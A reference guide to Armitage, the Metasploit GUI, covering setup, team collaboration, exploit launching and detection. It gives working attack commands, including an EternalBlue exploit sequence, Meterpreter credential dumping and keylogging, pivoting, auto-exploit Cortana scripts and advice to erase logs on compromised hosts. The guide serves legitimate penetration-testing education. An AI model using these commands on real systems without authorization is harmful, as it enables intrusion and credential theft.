---
tool_name: "armitage"
display_name: "Armitage"
mitre_tactic: "command_and_control"
mitre_tactic_id: "TA0011"
mitre_subcategory: "c2_frameworks"
install_command: "sudo apt install armitage"
version: "20221206"
github_repo: "https://github.com/rsmudge/armitage"
kali_tools_page: "https://www.kali.org/tools/armitage/"
difficulty_level: "beginner-to-intermediate"
requires_root: true
gui_available: true
tags: ["c2", "metasploit", "graphical", "red-team", "exploitation", "collaboration"]
related_tools: ["metasploit-framework", "msfconsole", "msfvenom"]
---

# Armitage

## Chapter 1: Introduction & Overview

### What is Armitage?
Armitage is a scriptable red team collaboration tool for Metasploit that visualizes targets, recommends exploits, and exposes the advanced post-exploitation features in the framework. It provides a graphical interface (GUI) to Metasploit Framework, making it accessible to practitioners who understand hacking concepts but may not use Metasploit command-line daily.

### History & Background
- **Created:** 2010 by Raphael Mudge
- **Maintained:** Community (originally hosted on Google Code, now on GitHub)
- **License:** BSD-3-Clause
- **Purpose:** Graphical cyber attack management, Metasploit visualization, team collaboration

Armitage bridges the gap between Metasploit's powerful command-line interface and a visual, intuitive GUI. It was designed to make Metasploit's capabilities more accessible while adding team collaboration features that allow multiple operators to share sessions and data.

### When to Use This Tool
- **Penetration testing:** Visual target management and exploit recommendation
- **Red team operations:** Team collaboration with shared sessions and data
- **Education:** Learning Metasploit concepts through visual interface
- **Quick engagements:** Fast setup for one-off assessments

### When NOT to Use This Tool
- Without explicit written authorization from the target organization
- For production network scanning without proper planning
- When you need fine-grained control that only msfconsole provides
- For automated/programmatic engagements (use msfconsole instead)

### Legal and Ethical Considerations
- **Always obtain written permission** before conducting any attacks
- **Understand your scope** - know exactly what systems you are authorized to test
- **Use the collaboration features responsibly** - shared sessions affect the entire team
- **Document everything** - maintain records of all exploit attempts and access obtained

### Key Concepts
- **Target Visualization:** Graphical representation of hosts, services, and vulnerabilities
- **Exploit Recommendation:** Automatic suggestion of applicable exploits for discovered services
- **Session Sharing:** Multiple operators can interact with the same compromised sessions
- **Cortana Scripts:** Automation scripts for repetitive tasks and workflows
- **Teamserver:** Centralized server for multi-operator collaboration

---

## Chapter 2: Installation & Setup

### System Requirements
- **Minimum RAM:** 2 GB (4 GB recommended for GUI)
- **Disk Space:** 200 MB for base install
- **Display:** X11 or VNC for GUI rendering
- **Privileges:** Root required for msfrpcd operations
- **Java:** OpenJDK 11 or later

### Installation Methods

#### Method 1: APT (Recommended)
```bash
sudo apt update
sudo apt install armitage
```

#### Method 2: From Source
```bash
git clone https://github.com/rsmudge/armitage.git
cd armitage
# Build with ant (requires ant and JDK)
ant build
```

### Starting Armitage
```bash
# Start Armitage (will auto-start msfrpcd)
armitage
```

### Teamserver Setup (Multi-Operator)
```bash
# Start teamserver with IP and password
teamserver 192.168.1.100 s3cr3t_password

# Output shows:
# Host: 192.168.1.100
# Port: 55553
# User: msf
# Pass: s3cr3t_password
```

### Connecting to the Teamserver
1. Launch Armitage on the client machine
2. Select "Connect" and enter the teamserver IP, port, and credentials
3. Verify the fingerprint matches
4. You are now connected to the shared Metasploit instance

---

## Chapter 3: Core Concepts

### The Armitage Interface
- **Targets Panel:** Visual representation of discovered hosts
- **Modules Panel:** Searchable list of Metasploit exploits, auxiliary, and post modules
- **Console Panel:** Metasploit console output and command input
- **Sessions Panel:** Active Meterpreter and shell sessions
- **Events Panel:** Log of all actions taken by operators

### Target Discovery
Armitage uses Nmap for host discovery:
```bash
# From the GUI:
# 1. Click "Hosts" > "Nmap Scan"
# 2. Select scan type (Quick, Intense, etc.)
# 3. Enter target range
# 4. Click "Launch"
```

### Exploit Recommendation
Once hosts are discovered, Armitage analyzes services and recommends exploits:
- Green lightning bolt: Exploit likely to work
- Orange lightning bolt: Exploit may work but risky
- Red lightning bolt: Exploit likely to fail or crash service

### Session Management
- **Meterpreter Sessions:** Full post-exploitation capabilities
- **Shell Sessions:** Basic command execution
- **VNC Sessions:** Graphical remote access
- **Session Routing:** Route traffic through sessions for pivoting

---

## Chapter 4: Basic Usage

### Host Discovery
```bash
# Via GUI
# Hosts > Nmap Scan > Quick Scan (5 minutes)
# Hosts > Nmap Scan > Intense Scan (20+ minutes)

# Via console (within Armitage)
db_nmap -sV 192.168.1.0/24
```

### Running an Exploit
1. Double-click a host in the targets panel
2. Browse available exploits in the modules panel
3. Right-click an exploit and select "Launch"
4. Configure exploit options in the dialog
5. Click "Launch" to execute

### Meterpreter Post-Exploitation
```bash
# Once you have a Meterpreter session:
sysinfo                    # Get target system information
getuid                     # Get current user
getsystem                  # Attempt privilege escalation
hashdump                   # Dump password hashes
screenshot                 # Capture target screen
keyscan_start              # Start keylogger
keyscan_dump               # Dump captured keys
download <file>            # Download file from target
upload <file>              # Upload file to target
```

### Using the Console
The Armitage console is a fully functional Metasploit console:
```bash
# Search for exploits
search type:exploit platform:windows smb

# Use a specific module
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.168.1.50
set LHOST 192.168.1.100

# Run the exploit
exploit
```

### Team Collaboration
- **Shared Sessions:** All operators see the same sessions
- **Event Log:** Every action is logged and visible to all team members
- **Session Handoff:** Operators can take over sessions from others
- **Parallel Operations:** Multiple operators can work different targets simultaneously

---

## Chapter 5: Advanced Usage

### Cortana Scripting
Cortana is Armitage's automation language:
```bash
# Create a Cortana script
on session {
    println("New session from " . $1 . " on " . host_os($1));
    session_system($1);
}
```

### Host Enumeration
```bash
# Run a full Nmap scan from within Armitage
db_nmap -A -T4 192.168.1.0/24

# Run SMB enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
```

### Pivoting
```bash
# Set up a route through a compromised host
run autoroute -s 10.0.0.0/24

# Use SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run

# Configure proxychains
# Edit /etc/proxychains.conf:
# socks4 127.0.0.1 1080
```

### Post-Exploitation Modules
```bash
# Use post modules on compromised sessions
use post/windows/gather/enum_applications
set SESSION <session_id>
run

use post/multi/recon/local_exploiter_suggester
set SESSION <session_id>
run
```

---

## Chapter 6: Integration & Automation

### Metasploit Integration
Armitage is a front-end for Metasploit Framework. All Metasploit modules are accessible:
- **Exploits:** 2000+ exploits for various platforms
- **Auxiliary:** Scanners, fuzzers, and support modules
- **Payloads:** Meterpreter, shells, and custom payloads
- **Post:** Post-exploitation modules for information gathering

### Integration with Other Tools
- **Nmap:** Built-in host discovery and service detection
- **Nessus:** Import Nessus scan results for targeted exploitation
- **Social Engineering Toolkit (SET):** Generate payloads for social engineering attacks
- **Custom Scripts:** Cortana scripting for workflow automation

### Automation Workflows
```bash
# Import hosts from external scan
# Hosts > Import Hosts > Select file

# Run automated scan and exploit
# Attacks > Hail Mary (use with caution)

# Create custom workflow
# File > New Script > Save as .cns file
```

---

## Chapter 7: OPSEC & Defense Evasion

### Detection Avoidance
- **Use stealthy scans:** Avoid noisy Nmap scans that trigger IDS/IPS
- **Limit concurrent exploits:** Don't run too many exploits simultaneously
- **Monitor target responses:** Watch for signs of detection
- **Use encrypted sessions:** Prefer Meterpreter over plain shells
- **Clean up artifacts:** Remove logs and traces on compromised hosts

### Best Practices
1. Start with stealthy reconnaissance before exploiting
2. Use the recommended exploit ratings to prioritize targets
3. Document all activity using Armitage's event logging
4. Coordinate with team members to avoid conflicts
5. Have a plan for burning infrastructure

### Common Mistakes
- Running too many exploits at once (causes crashes)
- Not verifying exploit success before proceeding
- Ignoring target feedback (failed exploits may be logged)
- Not setting up proper pivoting before lateral movement

---

## Chapter 8: Troubleshooting & FAQ

### Common Issues

**Problem: Armitage won't start**
```bash
# Check Java version
java -version

# Start msfrpcd manually
msfrpcd -P your_password -S -f

# Try connecting with msfrpc client
msfrpc -P your_password -a 127.0.0.1
```

**Problem: Connection refused**
- Verify msfrpcd is running: `ps aux | grep msfrpcd`
- Check port 55553 is open: `netstat -tlnp | grep 55553`
- Ensure PostgreSQL is running: `systemctl start postgresql`

**Problem: GUI is unresponsive**
- Close and reopen Armitage
- Check system resources (RAM, CPU)
- Try reducing the number of displayed targets

**Problem: Sessions don't appear**
- Verify the exploit actually succeeded
- Check the console output for errors
- Ensure the payload is compatible with the target

### Debug Mode
```bash
# Start Armitage with verbose output
armitage -v

# Check msfrpcd logs
tail -f /root/.msf4/logs/msfconsole.log
```

---

## Chapter 9: Real-World Scenarios

### Network Penetration Test Workflow

```bash
# 1. Start Armitage and connect to teamserver
armitage
# Enter teamserver IP, port 55553, and password

# 2. Discover hosts
# Hosts > Nmap Scan > Intense Scan (TCP)
# Targets appear in the Targets panel

# 3. Analyze and attack
# Right-click hosts to see recommended exploits
# Green bolt = likely success, Orange = risky, Red = likely fail

# 4. Launch exploit
# Double-click host > Select exploit > Configure options > Launch

# 5. Post-exploitation
# Once Meterpreter session opens:
sysinfo
getuid
hashdump
screenshot

# 6. Pivoting
run autoroute -s 10.0.0.0/24
use auxiliary/server/socks_proxy
set SRVPORT 1080
run

# 7. Scan internal network
db_nmap -sT 10.0.0.0/24
```

### Cortana Automation Script

```bash
# Auto-exploit script
on session {
    println("Session opened from " . $1);
    session_system($1);
    session_shell($1);
    exec("use post/windows/gather/enum_applications");
    exec("set SESSION " . $1);
    exec("run");
}
```

### Collaborative Red Team Exercise

```bash
# Team Lead: Start teamserver
teamserver 192.168.1.100 s3cr3t

# Operators connect to same teamserver
# All share sessions, events, and data
# Use Events panel to coordinate attacks
```

---

## Chapter 10: Cortana Scripting Reference

### Event Hooks

```bash
# On new session
on session {
    println("New session: " . $1);
}

# On host discovery
on host {
    println("New host: " . host_os($1));
}

# On console output
on console_output {
    println("Console: " . $1);
}
```

### Available Functions

| Function | Description |
|---|---|
| `host_os($id)` | Get host OS |
| `host_ip($id)` | Get host IP |
| `session_system($id)` | Get session system info |
| `session_shell($id)` | Drop to shell |
| `exec($cmd)` | Execute console command |
| `println($msg)` | Print to Armitage console |

---

## Chapter 11: Detection and Defense

### Network Signatures

- Multiple exploit attempts from single source
- Meterpreter sessions (encrypted TCP on port 4444 or other)
- Msfrpcd traffic on port 55553
- Unusual Nmap scan patterns

### Host-Based Detection

```bash
# Monitor for Metasploit payloads
# Windows Event IDs:
# - Event ID 4688: Process Creation
# - Event ID 1102: Audit Log Cleared

# Linux detection
grep -i "meterpreter\|metasploit" /var/log/syslog
journalctl | grep -i "suspicious.*process"
```

### Defense Recommendations

1. Deploy endpoint detection and response (EDR)
2. Monitor for exploit payloads
3. Implement exploit protection rules
4. Use application whitelisting
5. Monitor for credential dumping tools

### Exploit Protection

```bash
# Enable Windows Exploit Protection
# PowerShell command
Set-ProcessMitigation -System -Enable DEP,SEHOP,ForceRelocateImages

# Configure ASLR
Set-ProcessMitigation -System -Enable BottomUp,HighEntropy
```

---

## Resources

- **GitHub Repository:** https://github.com/rsmudge/armitage
- **Kali Tools Page:** https://www.kali.org/tools/armitage/
- **Armitage Website:** http://www.fastandeasyhacking.com
- **Metasploit Documentation:** https://docs.metasploit.com/
- **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
- **MITRE ATT&CK - Exploitation for Client Execution:** https://attack.mitre.org/techniques/T1203/
- **MITRE ATT&CK - Ingress Tool Transfer:** https://attack.mitre.org/techniques/T1105/
- **MITRE ATT&CK - Remote Services:** https://attack.mitre.org/techniques/T1021/
- **Related Tools:** Metasploit Framework, msfconsole, msfvenom
